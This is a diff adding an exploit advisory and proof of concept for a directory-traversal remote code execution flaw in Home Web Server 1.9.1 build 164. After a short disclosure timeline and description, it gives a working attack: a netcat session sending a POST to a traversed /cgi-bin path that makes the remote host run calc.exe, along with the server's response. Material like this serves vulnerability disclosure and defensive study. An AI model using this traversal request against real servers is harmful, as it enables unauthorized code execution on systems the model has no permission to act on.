@@ -1,0 +1,46 @@
+# Exploit Title: Home Web Server 1.9.1 build 164 - CGI Remote Code Execution
+# Date: 26/05/2017
+# Exploit Author: Guillaume Kaddouch
+#   Twitter: @gkweb76
+#   Blog: https://networkfilter.blogspot.com
+#   GitHub: https://github.com/gkweb76/exploits
+# Vendor Homepage: http://downstairs.dnsalias.net/ (does not exist anymore)
+# Software Link: http://download.cnet.com/Home-Web-Server/3000-2648_4-10652679.html
+# Version: 1.9.1 (build 164)
+# Tested on: Windows 7 SP1 Family x64 (FR)
+# Category: Webapps
+
+"""
+Disclosure Timeline:
+--------------------
+2017-05-26: Vulnerability discovered
+2017-05-26: Vendor website is down, no way to contact him
+
+ 
+Description :
+-------------
+Home Web Server allows to call cgi programs via POST which are located into /cgi-bin folder. However by using a directory traversal,
+it is possible to run any executable being on the remote host.
+ 
+
+Instructions:
+-------------
+- Starts Home Web Server.
+- Run this exploit from a remote Kali machine with netcat as below.
+"""
+
+# Connect with netcat, then drop a single POST to call the executable you want
+guillaume@kali:~/kiwi_syslog$ nc 10.0.0.100 80
+POST /cgi-bin/../../../../../../../../Windows/system32/calc.exe HTTP/1.1
+
+# Returned response
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 0
+Server: My Web Server (HWS164)
+
+"""
+[CTRL+C] : this is important to launch the executable we requested
+
+Calc.exe has been launched on the remote host.
+"""
